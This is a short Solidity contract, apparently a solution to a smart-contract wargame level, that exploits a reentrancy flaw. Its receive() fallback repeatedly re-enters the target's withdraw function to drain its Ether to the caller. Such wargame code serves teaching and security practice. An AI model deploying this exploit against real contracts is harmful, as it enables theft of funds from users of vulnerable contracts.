// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface IReentrancy {
  
  function balances(address) external view returns(uint);

  function donate(address _to) external payable;

  function balanceOf(address _who) external view returns (uint);

  function withdraw(uint _amount) external;

}

contract ReentrancySolution {

    function drainIt(IReentrancy _reentrancy) external payable {
        _reentrancy.donate{value: msg.value}(address(this));
        uint donation =  _reentrancy.balanceOf(address(this));
        require(donation > 0, "No donation was made");
        _reentrancy.withdraw(donation);
        uint balanceOfAfter =  _reentrancy.balanceOf(address(this));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        uint remainingContractBalance = msg.sender.balance;
        uint donation =  IReentrancy(msg.sender).balanceOf(address(this));
        if(remainingContractBalance > 0){
            uint withdrawal = _min(donation, remainingContractBalance);
            IReentrancy(msg.sender).withdraw(withdrawal);
        }
    }


    function _min(uint _a, uint _b) internal pure returns(uint){
        return _a > _b ? _b : _a;
    }


}
